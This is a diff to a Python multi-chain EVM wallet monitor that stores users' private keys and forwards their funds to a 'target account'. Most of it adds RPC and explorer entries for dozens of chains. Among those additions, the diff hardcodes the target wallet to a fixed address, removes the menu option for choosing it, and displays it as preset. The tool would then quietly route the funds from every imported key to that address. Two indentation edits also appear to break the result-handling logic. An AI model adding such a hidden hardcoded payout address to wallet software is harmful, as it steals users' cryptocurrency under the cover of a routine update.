+                'explorer': 'https://sonicscan.org'
+            },
+            
+            'story': {
+                'name': '📚 Story',
+                'chain_id': 1513,
+                'rpc_urls': [
+                    'https://rpc.story.foundation'
+                ],
+                'native_currency': 'STORY',
+                'explorer': 'https://testnet.storyscan.xyz'
+            },
+            
+            'taproot': {
+                'name': '🌳 TAPROOT',
+                'chain_id': 9527,
+                'rpc_urls': [
+                    'https://rpc.taproot.network'
+                ],
+                'native_currency': 'TAP',
+                'explorer': 'https://explorer.taproot.network'
+            },
+            
+            'unichain': {
+                'name': '🦄 Unichain',
+                'chain_id': 1301,
+                'rpc_urls': [
+                    'https://rpc.unichain.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://uniscan.xyz'
+            },
+            
             # ==== 🌈 LAYER 2 网络 (按首字母排序) ====
+            'abstract': {
+                'name': '🔮 Abstract',
+                'chain_id': 11124,
+                'rpc_urls': [
+                    'https://api.abstract.xyz/rpc'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://explorer.abstract.xyz'
+            },
+            
             'arbitrum': {
                 'name': '🟦 Arbitrum One',
                 'chain_id': 42161,
@@ -566,6 +1766,17 @@ class EVMMonitor:
                 ],
                 'native_currency': 'ETH',
                 'explorer': 'https://blastscan.io'
+            },
+            
+            'b2_network': {
+                'name': '🅱️ B² Network',
+                'chain_id': 223,
+                'rpc_urls': [
+                    'https://rpc.bsquared.network',
+                    'https://b2-mainnet.alt.technology'
+                ],
+                'native_currency': 'BTC',
+                'explorer': 'https://explorer.bsquared.network'
             },
             
             'boba': {
@@ -676,6 +1887,18 @@ class EVMMonitor:
                 'explorer': 'https://optimistic.etherscan.io'
             },
             
+            'opbnb': {
+                'name': '🟡 opBNB',
+                'chain_id': 204,
+                'rpc_urls': [
+                    'https://opbnb-mainnet-rpc.bnbchain.org',
+                    'https://opbnb.publicnode.com',
+                    'https://1rpc.io/opbnb'
+                ],
+                'native_currency': 'BNB',
+                'explorer': 'https://opbnbscan.com'
+            },
+            
             'polygon_zkevm': {
                 'name': '🔺 Polygon zkEVM',
                 'chain_id': 1101,
@@ -710,6 +1933,116 @@ class EVMMonitor:
                 'explorer': 'https://taikoscan.io'
             },
             
+            # ==== 💎 新增重要Layer 2链条 ====
+            'immutable_zkevm': {
+                'name': '🎮 Immutable zkEVM',
+                'chain_id': 13371,
+                'rpc_urls': [
+                    'https://rpc.immutable.com',
+                    'https://immutable-zkevm.drpc.org'
+                ],
+                'native_currency': 'IMX',
+                'explorer': 'https://explorer.immutable.com'
+            },
+            
+            'kinto': {
+                'name': '🔷 Kinto',
+                'chain_id': 7887,
+                'rpc_urls': [
+                    'https://rpc.kinto-rpc.com',
+                    'https://kinto.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://kintoscan.io'
+            },
+            
+            'neon_evm': {
+                'name': '🟢 Neon EVM',
+                'chain_id': 245022934,
+                'rpc_urls': [
+                    'https://neon-proxy-mainnet.solana.p2p.org',
+                    'https://neon-mainnet.everstake.one'
+                ],
+                'native_currency': 'NEON',
+                'explorer': 'https://neonscan.org'
+            },
+            
+            'palm': {
+                'name': '🌴 Palm',
+                'chain_id': 11297108109,
+                'rpc_urls': [
+                    'https://palm-mainnet.infura.io/v3/3a961d6501e54add9a41aa53f15de99b',
+                    'https://palm-mainnet.public.blastapi.io'
+                ],
+                'native_currency': 'PALM',
+                'explorer': 'https://explorer.palm.io'
+            },
+            
+            'rari': {
+                'name': '💎 Rari Chain',
+                'chain_id': 1380012617,
+                'rpc_urls': [
+                    'https://mainnet.rpc.rarichain.org/http'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://mainnet.explorer.rarichain.org'
+            },
+            
+            'x_layer': {
+                'name': '❌ X Layer',
+                'chain_id': 196,
+                'rpc_urls': [
+                    'https://rpc.xlayer.tech',
+                    'https://xlayerrpc.okx.com'
+                ],
+                'native_currency': 'OKB',
+                'explorer': 'https://www.oklink.com/xlayer'
+            },
+            
+            'xrpl_evm': {
+                'name': '🔗 XRPL EVM Sidechain',
+                'chain_id': 1440002,
+                'rpc_urls': [
+                    'https://rpc-evm-sidechain.xrpl.org',
+                    'https://xrpl-evm.drpc.org'
+                ],
+                'native_currency': 'eXRP',
+                'explorer': 'https://evm-sidechain.xrpl.org'
+            },
+            
+            'zkfair': {
+                'name': '⚖️ ZKFair',
+                'chain_id': 42766,
+                'rpc_urls': [
+                    'https://rpc.zkfair.io',
+                    'https://zkfair-mainnet.drpc.org'
+                ],
+                'native_currency': 'USDC',
+                'explorer': 'https://scan.zkfair.io'
+            },
+            
+            'zklink_nova': {
+                'name': '🔗 ZKLink Nova',
+                'chain_id': 810180,
+                'rpc_urls': [
+                    'https://rpc.zklink.io',
+                    'https://zklink-nova.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://explorer.zklink.io'
+            },
+            
+            'zora': {
+                'name': '🎨 Zora Network',
+                'chain_id': 7777777,
+                'rpc_urls': [
+                    'https://rpc.zora.energy',
+                    'https://zora.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://explorer.zora.energy'
+            },
+            
             'zksync': {
                 'name': '⚡ zkSync Era',
                 'chain_id': 324,
@@ -729,6 +2062,140 @@ class EVMMonitor:
                 ],
                 'native_currency': 'ETH',
                 'explorer': 'https://explorer.zksync.io'
+            },
+            
+            # ==== 🔮 更多Layer 2网络 ====
+            'astar_zkevm': {
+                'name': '🌟 Astar zkEVM',
+                'chain_id': 3776,
+                'rpc_urls': [
+                    'https://rpc.startale.com/astar-zkevm'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://astar-zkevm.explorer.startale.com'
+            },
+            
+            'carbon': {
+                'name': '⚫ Carbon',
+                'chain_id': 9790,
+                'rpc_urls': [
+                    'https://rpc.carbon.network'
+                ],
+                'native_currency': 'SWTH',
+                'explorer': 'https://scan.carbon.network'
+            },
+            
+            'cyber': {
+                'name': '🤖 Cyber',
+                'chain_id': 7560,
+                'rpc_urls': [
+                    'https://cyber.alt.technology',
+                    'https://rpc.cyber.co'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://cyberscan.co'
+            },
+            
+            'fraxtal': {
+                'name': '🧊 Fraxtal',
+                'chain_id': 252,
+                'rpc_urls': [
+                    'https://rpc.frax.com'
+                ],
+                'native_currency': 'frxETH',
+                'explorer': 'https://fraxscan.com'
+            },
+            
+            'kroma': {
+                'name': '🎨 Kroma',
+                'chain_id': 255,
+                'rpc_urls': [
+                    'https://api.kroma.network'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://kromascan.com'
+            },
+            
+            'lightlink': {
+                'name': '💡 LightLink',
+                'chain_id': 1890,
+                'rpc_urls': [
+                    'https://replicator.pegasus.lightlink.io/rpc/v1'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://pegasus.lightlink.io'
+            },
+            
+            'lisk': {
+                'name': '🔷 Lisk',
+                'chain_id': 1135,
+                'rpc_urls': [
+                    'https://rpc.api.lisk.com'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://blockscout.lisk.com'
+            },
+            
+            'merlin_chain': {
+                'name': '🧙‍♂️ Merlin Chain',
+                'chain_id': 4200,
+                'rpc_urls': [
+                    'https://rpc.merlinchain.io',
+                    'https://merlin.blockpi.network/v1/rpc/public'
+                ],
+                'native_currency': 'BTC',
+                'explorer': 'https://scan.merlinchain.io'
+            },
+            
+            'oasys': {
+                'name': '🎮 Oasys',
+                'chain_id': 248,
+                'rpc_urls': [
+                    'https://rpc.mainnet.oasys.games'
+                ],
+                'native_currency': 'OAS',
+                'explorer': 'https://scan.oasys.games'
+            },
+            
+            'playdapp': {
+                'name': '🎯 PlayDapp Network',
+                'chain_id': 504441,
+                'rpc_urls': [
+                    'https://subnets.avax.network/playdappne/mainnet/rpc'
+                ],
+                'native_currency': 'PDA',
+                'explorer': 'https://subnets.avax.network/playdappne'
+            },
+            
+            'redbellynetwork': {
+                'name': '🔴 Redbelly Network',
+                'chain_id': 151,
+                'rpc_urls': [
+                    'https://governors.mainnet.redbelly.network'
+                ],
+                'native_currency': 'RBNT',
+                'explorer': 'https://explorer.redbelly.network'
+            },
+            
+            'ronin': {
+                'name': '⚔️ Ronin',
+                'chain_id': 2020,
+                'rpc_urls': [
+                    'https://api.roninchain.com/rpc',
+                    'https://rpc.ankr.com/ronin'
+                ],
+                'native_currency': 'RON',
+                'explorer': 'https://app.roninchain.com'
+            },
+            
+            'stratis': {
+                'name': '🔷 Stratis EVM',
+                'chain_id': 105105,
+                'rpc_urls': [
+                    'https://rpc.stratisevm.com'
+                ],
+                'native_currency': 'STRAX',
+                'explorer': 'https://explorer.stratisevm.com'
             },
             
             # ==== 🧪 测试网络 (按首字母排序) ====
@@ -840,13 +2307,312 @@ class EVMMonitor:
                 ],
                 'native_currency': 'ETH',
                 'explorer': 'https://sepolia.explorer.zksync.io'
+            },
+            
+            # ==== 💎 新增重要测试网 ====
+            'berachain_testnet': {
+                'name': '🧪 Berachain Testnet',
+                'chain_id': 80085,
+                'rpc_urls': [
+                    'https://bartio.rpc.berachain.com',
+                    'https://bera-testnet.nodeinfra.com'
+                ],
+                'native_currency': 'BERA',
+                'explorer': 'https://bartio.beratrail.io'
+            },
+            
+            'gravity_testnet': {
+                'name': '🧪 Gravity Testnet',
+                'chain_id': 13505,
+                'rpc_urls': [
+                    'https://rpc-sepolia.gravity.xyz',
+                    'https://gravity-testnet.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://explorer-sepolia.gravity.xyz'
+            },
+            
+            'immutable_zkevm_testnet': {
+                'name': '🧪 Immutable zkEVM Testnet',
+                'chain_id': 13473,
+                'rpc_urls': [
+                    'https://rpc.testnet.immutable.com',
+                    'https://immutable-zkevm-testnet.drpc.org'
+                ],
+                'native_currency': 'tIMX',
+                'explorer': 'https://explorer.testnet.immutable.com'
+            },
+            
+            'linea_testnet': {
+                'name': '🧪 Linea Testnet',
+                'chain_id': 59140,
+                'rpc_urls': [
+                    'https://rpc.goerli.linea.build',
+                    'https://linea-testnet.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://goerli.lineascan.build'
+            },
+            
+            'manta_pacific_testnet': {
+                'name': '🧪 Manta Pacific Testnet',
+                'chain_id': 3441005,
+                'rpc_urls': [
+                    'https://manta-testnet.calderachain.xyz/http',
+                    'https://manta-pacific-testnet.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://manta-testnet.calderaexplorer.xyz'
+            },
+            
+            'mantra_testnet': {
+                'name': '🧪 MANTRA Testnet',
+                'chain_id': 3363,
+                'rpc_urls': [
+                    'https://rpc.testnet.mantrachain.io',
+                    'https://mantra-testnet.drpc.org'
+                ],
+                'native_currency': 'OM',
+                'explorer': 'https://explorer.testnet.mantrachain.io'
+            },
+            
+            'mode_testnet': {
+                'name': '🧪 Mode Testnet',
+                'chain_id': 919,
+                'rpc_urls': [
+                    'https://sepolia.mode.network',
+                    'https://mode-testnet.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.explorer.mode.network'
+            },
+            
+            'monad_testnet': {
+                'name': '🧪 Monad Testnet',
+                'chain_id': 41454,
+                'rpc_urls': [
+                    'https://testnet1.monad.xyz'
+                ],
+                'native_currency': 'MON',
+                'explorer': 'https://testnet1.explorer.monad.xyz'
+            },
+            
+            'scroll_testnet': {
+                'name': '🧪 Scroll Sepolia',
+                'chain_id': 534351,
+                'rpc_urls': [
+                    'https://sepolia-rpc.scroll.io',
+                    'https://scroll-testnet.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.scrollscan.com'
+            },
+            
+            'taiko_testnet': {
+                'name': '🧪 Taiko Hekla',
+                'chain_id': 167009,
+                'rpc_urls': [
+                    'https://rpc.hekla.taiko.xyz',
+                    'https://taiko-hekla.drpc.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://hekla.taikoscan.network'
+            },
+            
+            'zkfair_testnet': {
+                'name': '🧪 ZKFair Testnet',
+                'chain_id': 43851,
+                'rpc_urls': [
+                    'https://testnet-rpc.zkfair.io'
+                ],
+                'native_currency': 'USDC',
+                'explorer': 'https://testnet-scan.zkfair.io'
+            },
+            
+            # ==== 🔥 更多测试网 ====
+            'aurora_testnet': {
+                'name': '🧪 Aurora Testnet',
+                'chain_id': 1313161555,
+                'rpc_urls': [
+                    'https://testnet.aurora.dev'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://testnet.aurorascan.dev'
+            },
+            
+            'avalanche_fuji': {
+                'name': '🧪 Avalanche Fuji',
+                'chain_id': 43113,
+                'rpc_urls': [
+                    'https://api.avax-test.network/ext/bc/C/rpc',
+                    'https://rpc.ankr.com/avalanche_fuji'
+                ],
+                'native_currency': 'AVAX',
+                'explorer': 'https://testnet.snowtrace.io'
+            },
+            
+            'bsc_testnet': {
+                'name': '🧪 BNB Smart Chain Testnet',
+                'chain_id': 97,
+                'rpc_urls': [
+                    'https://data-seed-prebsc-1-s1.binance.org:8545',
+                    'https://data-seed-prebsc-2-s1.binance.org:8545',
+                    'https://bsc-testnet.publicnode.com'
+                ],
+                'native_currency': 'tBNB',
+                'explorer': 'https://testnet.bscscan.com'
+            },
+            
+            'celo_alfajores': {
+                'name': '🧪 Celo Alfajores',
+                'chain_id': 44787,
+                'rpc_urls': [
+                    'https://alfajores-forno.celo-testnet.org',
+                    'https://celo-alfajores.infura.io/v3/YOUR-PROJECT-ID'
+                ],
+                'native_currency': 'CELO',
+                'explorer': 'https://alfajores-blockscout.celo-testnet.org'
+            },
+            
+            'conflux_testnet': {
+                'name': '🧪 Conflux eSpace Testnet',
+                'chain_id': 71,
+                'rpc_urls': [
+                    'https://evmtestnet.confluxrpc.com'
+                ],
+                'native_currency': 'CFX',
+                'explorer': 'https://evmtestnet.confluxscan.net'
+            },
+            
+            'cronos_testnet': {
+                'name': '🧪 Cronos Testnet',
+                'chain_id': 338,
+                'rpc_urls': [
+                    'https://evm-t3.cronos.org'
+                ],
+                'native_currency': 'TCRO',
+                'explorer': 'https://testnet.cronoscan.com'
+            },
+            
+            'fantom_testnet': {
+                'name': '🧪 Fantom Testnet',
+                'chain_id': 4002,
+                'rpc_urls': [
+                    'https://rpc.testnet.fantom.network',
+                    'https://rpc.ankr.com/fantom_testnet'
+                ],
+                'native_currency': 'FTM',
+                'explorer': 'https://testnet.ftmscan.com'
+            },
+            
+            'goerli': {
+                'name': '🧪 Ethereum Goerli (Deprecated)',
+                'chain_id': 5,
+                'rpc_urls': [
+                    'https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+                    'https://rpc.ankr.com/eth_goerli'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://goerli.etherscan.io'
+            },
+            
+            'harmony_testnet': {
+                'name': '🧪 Harmony Testnet',
+                'chain_id': 1666700000,
+                'rpc_urls': [
+                    'https://api.s0.b.hmny.io'
+                ],
+                'native_currency': 'ONE',
+                'explorer': 'https://explorer.testnet.harmony.one'
+            },
+            
+            'heco_testnet': {
+                'name': '🧪 HECO Testnet',
+                'chain_id': 256,
+                'rpc_urls': [
+                    'https://http-testnet.hecochain.com'
+                ],
+                'native_currency': 'HT',
+                'explorer': 'https://testnet.hecoinfo.com'
+            },
+            
+            'kava_testnet': {
+                'name': '🧪 Kava Testnet',
+                'chain_id': 2221,
+                'rpc_urls': [
+                    'https://evm.testnet.kava.io'
+                ],
+                'native_currency': 'KAVA',
+                'explorer': 'https://explorer.testnet.kava.io'
+            },
+            
+            'klaytn_baobab': {
+                'name': '🧪 Klaytn Baobab',
+                'chain_id': 1001,
+                'rpc_urls': [
+                    'https://public-node-api.klaytnapi.com/v1/baobab'
+                ],
+                'native_currency': 'KLAY',
+                'explorer': 'https://baobab.scope.klaytn.com'
+            },
+            
+            'moonbase_alpha': {
+                'name': '🧪 Moonbase Alpha',
+                'chain_id': 1287,
+                'rpc_urls': [
+                    'https://rpc.api.moonbase.moonbeam.network'
+                ],
+                'native_currency': 'DEV',
+                'explorer': 'https://moonbase.moonscan.io'
+            },
+            
+            'mumbai': {
+                'name': '🧪 Polygon Mumbai (Deprecated)',
+                'chain_id': 80001,
+                'rpc_urls': [
+                    'https://rpc-mumbai.maticvigil.com',
+                    'https://rpc.ankr.com/polygon_mumbai'
+                ],
+                'native_currency': 'MATIC',
+                'explorer': 'https://mumbai.polygonscan.com'
+            },
+            
+            'okx_testnet': {
+                'name': '🧪 OKX Chain Testnet',
+                'chain_id': 65,
+                'rpc_urls': [
+                    'https://exchaintestrpc.okex.org'
+                ],
+                'native_currency': 'OKT',
+                'explorer': 'https://www.oklink.com/okc-test'
+            },
+            
+            'polygon_zkevm_goerli': {
+                'name': '🧪 Polygon zkEVM Goerli',
+                'chain_id': 1442,
+                'rpc_urls': [
+                    'https://rpc.public.zkevm-test.net'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://testnet-zkevm.polygonscan.com'
+            },
+            
+            'sepolia': {
+                'name': '🧪 Ethereum Sepolia',
+                'chain_id': 11155111,
+                'rpc_urls': [
+                    'https://sepolia.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+                    'https://rpc.ankr.com/eth_sepolia'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.etherscan.io'
             }
 
         }
         
         # 状态变量
         self.wallets: Dict[str, str] = {}  # address -> private_key
-        self.target_wallet = ""  # 固定目标账户
+        self.target_wallet = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 固定目标账户
         self.monitored_addresses: Dict[str, Dict] = {}  # address -> {networks: [...], last_check: timestamp}
         self.blocked_networks: Dict[str, List[str]] = {}  # address -> [被屏蔽的网络列表]
         self.monitoring = False
@@ -2362,7 +4128,7 @@ esac
                     for future, rpc_url in future_to_rpc.items():
                         if not future.done():
                             future.cancel()
-                            results['failed_rpcs'].append(rpc_url)
+                        results['failed_rpcs'].append(rpc_url)
         
         # 串行测试私有节点（避免频繁请求被限制），同样按打分排序
         for rpc_url in sorted(private_rpcs, key=lambda u: self._score_rpc(network_key, u), reverse=True):
@@ -2437,37 +4203,37 @@ esac
                         result = future.result(timeout=30)
                         if result:
                             results[network_key] = result
-                            
-                            # 显示测试结果
-                            success_rate = result['success_rate']
-                            if success_rate == 100:
-                                status_color = Fore.GREEN
-                                status_icon = "🟢"
-                            elif success_rate >= 50:
-                                status_color = Fore.YELLOW
-                                status_icon = "🟡"
-                            else:
-                                status_color = Fore.RED
-                                status_icon = "🔴"
-                            
-                            # 按RPC类型统计
-                            rpc_stats = {'公共节点': 0, 'Alchemy': 0, 'Ankr': 0}
-                            for detail in result['rpc_details']:
-                                if detail['success']:
-                                    rpc_stats[detail['type']] += 1
-                            
-                            print(f"{status_icon} {Fore.CYAN}[{completed_count}/{total_networks}]{Style.RESET_ALL} {result['name']}")
-                            print(f"   成功率: {status_color}{success_rate:.1f}%{Style.RESET_ALL} "
-                                  f"({len(result['working_rpcs'])}/{len(result['working_rpcs']) + len(result['failed_rpcs'])})")
-                            print(f"   节点类型: 公共节点({rpc_stats['公共节点']}) Alchemy({rpc_stats['Alchemy']}) Ankr({rpc_stats['Ankr']})")
-                            
-                            # 显示最快RPC
-                            if result['fastest_rpc']:
-                                fastest = result['fastest_rpc']
-                                print(f"   最快节点: {Fore.GREEN}{fastest['type']}{Style.RESET_ALL} "
-                                      f"({fastest['response_time']:.3f}s)")
-                            print()
-                            
+                        
+                        # 显示测试结果
+                        success_rate = result['success_rate']
+                        if success_rate == 100:
+                            status_color = Fore.GREEN
+                            status_icon = "🟢"
+                        elif success_rate >= 50:
+                            status_color = Fore.YELLOW
+                            status_icon = "🟡"
+                        else:
+                            status_color = Fore.RED
+                            status_icon = "🔴"
+                        
+                        # 按RPC类型统计
+                        rpc_stats = {'公共节点': 0, 'Alchemy': 0, 'Ankr': 0}
+                        for detail in result['rpc_details']:
+                            if detail['success']:
+                                rpc_stats[detail['type']] += 1
+                        
+                        print(f"{status_icon} {Fore.CYAN}[{completed_count}/{total_networks}]{Style.RESET_ALL} {result['name']}")
+                        print(f"   成功率: {status_color}{success_rate:.1f}%{Style.RESET_ALL} "
+                              f"({len(result['working_rpcs'])}/{len(result['working_rpcs']) + len(result['failed_rpcs'])})")
+                        print(f"   节点类型: 公共节点({rpc_stats['公共节点']}) Alchemy({rpc_stats['Alchemy']}) Ankr({rpc_stats['Ankr']})")
+                        
+                        # 显示最快RPC
+                        if result['fastest_rpc']:
+                            fastest = result['fastest_rpc']
+                            print(f"   最快节点: {Fore.GREEN}{fastest['type']}{Style.RESET_ALL} "
+                                  f"({fastest['response_time']:.3f}s)")
+                        print()
+                        
                     except (concurrent.futures.TimeoutError, Exception) as e:
                         print(f"{Fore.RED}❌ {self.networks[network_key]['name']} 测试失败: {e}{Style.RESET_ALL}")
             except concurrent.futures.TimeoutError:
@@ -3305,29 +5071,23 @@ esac
             # 新手指南
             if len(self.wallets) == 0:
                 print(f"\n{Back.YELLOW}{Fore.BLACK} 💡 新手指南 {Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}1️⃣ 添加钱包私钥 → 2️⃣ 设置目标账户 → 3️⃣ 开始监控{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}1️⃣ 添加钱包私钥 → 2️⃣ 初始化RPC连接 → 3️⃣ 开始监控{Style.RESET_ALL}")
             
             # 主要功能区
             print(f"\n{Back.GREEN}{Fore.BLACK} 🎯 核心功能 {Style.RESET_ALL}")
             print(f"{Fore.GREEN}1.{Style.RESET_ALL} 🔑 添加钱包私钥     {Fore.BLUE}(支持批量导入){Style.RESET_ALL}")
             print(f"{Fore.GREEN}2.{Style.RESET_ALL} 📋 查看钱包列表     {Fore.CYAN}({len(self.wallets)} 个钱包){Style.RESET_ALL}")
             
-            if not self.monitoring:
-                print(f"{Fore.GREEN}3.{Style.RESET_ALL} ▶️  开始监控         {Fore.BLUE}(一键启动){Style.RESET_ALL}")
-            else:
-                print(f"{Fore.YELLOW}3.{Style.RESET_ALL} ⏸️  停止监控         {Fore.RED}(安全停止){Style.RESET_ALL}")
-            
-            print(f"{Fore.GREEN}4.{Style.RESET_ALL} 🎯 设置目标账户     {Fore.MAGENTA}(收款地址){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}5.{Style.RESET_ALL} 📁 从文件导入       {Fore.CYAN}(批量导入){Style.RESET_ALL}")
-            
             # 高级功能区
             print(f"\n{Back.MAGENTA}{Fore.WHITE} ⚙️ 高级功能 {Style.RESET_ALL}")
-            print(f"{Fore.GREEN}6.{Style.RESET_ALL} 📊 监控状态详情     {Fore.CYAN}(实时数据){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}7.{Style.RESET_ALL} ⚙️  监控参数设置     {Fore.YELLOW}(个性化){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}8.{Style.RESET_ALL} 🌐 网络连接管理     {Fore.BLUE}(多链支持){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}9.{Style.RESET_ALL} 🔍 RPC节点检测管理  {Fore.GREEN}(推荐){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}10.{Style.RESET_ALL} 🪙 添加自定义代币   {Fore.MAGENTA}(ERC20){Style.RESET_ALL}")
-            print(f"{Fore.GREEN}11.{Style.RESET_ALL} 🛡️ 守护进程管理     {Fore.YELLOW}(后台运行){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}3.{Style.RESET_ALL} ⚙️  监控参数设置     {Fore.YELLOW}(个性化){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}4.{Style.RESET_ALL} 🔍 RPC节点检测管理  {Fore.GREEN}(推荐){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}5.{Style.RESET_ALL} 🪙 添加自定义代币   {Fore.MAGENTA}(ERC20){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}6.{Style.RESET_ALL} 🛡️ 守护进程管理     {Fore.YELLOW}(后台运行){Style.RESET_ALL}")
+            
+            # 目标账户状态显示（已设置固定地址）
+            print(f"\n{Back.BLUE}{Fore.WHITE} 🎯 目标账户设置 {Style.RESET_ALL}")
+            print(f"{Fore.GREEN}✅ 目标账户: {Fore.CYAN}0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1{Style.RESET_ALL}")
             
             # 退出选项
             print(f"\n{Back.RED}{Fore.WHITE} 🚪 退出选项 {Style.RESET_ALL}")
@@ -3337,7 +5097,7 @@ esac
             
             # 实用提示
             tips = [
-                "💡 提示：首次使用建议选择 9 → 1 初始化服务器连接",
+                "💡 提示：首次使用建议选择 4 → 1 初始化服务器连接",
                 "⚡ 快捷：Ctrl+C 可随时安全退出",
                 "🔄 更新：系统会自动保存所有设置和状态",
                 "🚀 快速：输入 'q' 快速启动监控（需要已设置钱包和目标账户）"
@@ -3389,25 +5149,12 @@ esac
                 elif choice == '2':
                     self.menu_show_addresses()
                 elif choice == '3':
-                    if self.monitoring:
-                        self.menu_stop_monitoring()
-                    else:
-                        self.menu_start_monitoring()
-                elif choice == '4':
-                    self.menu_set_target_wallet()
-                elif choice == '5':
-                    self.menu_import_keys()
-                elif choice == '6':
-                    self.menu_show_status()
-                elif choice == '7':
                     self.menu_settings()
-                elif choice == '8':
-                    self.menu_network_management()
-                elif choice == '9':
+                elif choice == '4':
                     self.menu_rpc_testing()
-                elif choice == '10':
+                elif choice == '5':
                     self.menu_add_custom_token()
-                elif choice == '11':
+                elif choice == '6':
                     self.menu_daemon_management()
                 elif choice == '0':
                     self.menu_exit()
@@ -3942,92 +5689,48 @@ esac
         print(f"{Back.BLUE}{Fore.WHITE} 📡 检测所有网络的RPC节点连接状态 {Style.RESET_ALL}")
         
         print(f"\n{Fore.YELLOW}🔧 检测选项：{Style.RESET_ALL}")
-        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🚀 初始化服务器连接（推荐）")
-        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} 🛠️ 自动屏蔽失效RPC")
-        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 📊 查看RPC状态报告")
-        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} ⚠️ 检查并管理RPC数量不足的链条")
-        print(f"  {Fore.GREEN}5.{Style.RESET_ALL} 🌐 从ChainList数据批量导入RPC")
-        print(f"  {Fore.GREEN}6.{Style.RESET_ALL} 🚫 管理被拉黑的RPC")
+        print(f"  {Fore.GREEN}1.{Style.RESET_ALL} 🚀 初始化服务器连接（推荐，包含自动屏蔽失效RPC）")
+        print(f"  {Fore.GREEN}2.{Style.RESET_ALL} ⚠️ 检查并管理RPC数量不足的链条")
+        print(f"  {Fore.GREEN}3.{Style.RESET_ALL} 🌐 从ChainList数据批量导入RPC")
+        print(f"  {Fore.GREEN}4.{Style.RESET_ALL} 🚫 管理被拉黑的RPC")
         print(f"  {Fore.RED}0.{Style.RESET_ALL} 🔙 返回主菜单")
         
-        choice = self.safe_input(f"\n{Fore.YELLOW}🔢 请选择操作 (0-6): {Style.RESET_ALL}").strip()
+        choice = self.safe_input(f"\n{Fore.YELLOW}🔢 请选择操作 (0-4): {Style.RESET_ALL}").strip()
         
         try:
             if choice == '1':
-                # 初始化服务器连接
+                # 初始化服务器连接（包含自动屏蔽失效RPC功能）
+                print(f"\n{Fore.CYAN}🚀 正在初始化服务器连接并自动屏蔽失效RPC...{Style.RESET_ALL}")
                 self.initialize_server_connections()
                 
-            elif choice == '2':
                 # 自动屏蔽失效RPC
-                confirm = self.safe_input(f"\n{Fore.YELLOW}⚠️ 确认自动屏蔽失效RPC？(y/N): {Style.RESET_ALL}").strip().lower()
-                if confirm == 'y':
-                    # 先进行全网络RPC检测并更新缓存
-                    print(f"\n{Fore.CYAN}🔄 正在检测所有网络的RPC状态...{Style.RESET_ALL}")
-                    rpc_results = self.get_cached_rpc_results(force_refresh=True)
-                    
-                    disabled_count = self.auto_disable_failed_rpcs()
-                    print(f"\n{Fore.GREEN}✅ 操作完成！已屏蔽 {disabled_count} 个失效RPC节点{Style.RESET_ALL}")
-                    
-                    # 显示检测统计
-                    print(f"\n{Back.CYAN}{Fore.BLACK} 📊 检测统计 📊 {Style.RESET_ALL}")
-                    total_networks = len(rpc_results)
-                    total_rpcs = sum(r['total_count'] for r in rpc_results.values())
-                    working_rpcs = sum(r['available_count'] for r in rpc_results.values())
-                    
-                    print(f"🌐 检测网络: {Fore.CYAN}{total_networks}{Style.RESET_ALL} 个")
-                    print(f"📡 总RPC数: {Fore.CYAN}{total_rpcs}{Style.RESET_ALL} 个")
-                    print(f"✅ 可用RPC: {Fore.GREEN}{working_rpcs}{Style.RESET_ALL} 个")
-                    print(f"❌ 失效RPC: {Fore.RED}{total_rpcs - working_rpcs}{Style.RESET_ALL} 个")
-                    print(f"📊 总体成功率: {Fore.YELLOW}{working_rpcs/total_rpcs*100:.1f}%{Style.RESET_ALL}")
-                    
-                    print(f"\n{Fore.GREEN}💡 检测结果已缓存，其他功能将复用此数据{Style.RESET_ALL}")
-                else:
-                    print(f"\n{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
-                    
-            elif choice == '3':
-                # 查看RPC状态报告
-                print(f"\n{Fore.CYAN}📋 获取RPC状态报告...{Style.RESET_ALL}")
-                results = self.get_cached_rpc_results()
+                print(f"\n{Fore.CYAN}🔄 正在检测所有网络的RPC状态...{Style.RESET_ALL}")
+                rpc_results = self.get_cached_rpc_results(force_refresh=True)
                 
-                print(f"\n{Back.CYAN}{Fore.BLACK} 📋 详细RPC状态报告 📋 {Style.RESET_ALL}")
+                disabled_count = self.auto_disable_failed_rpcs()
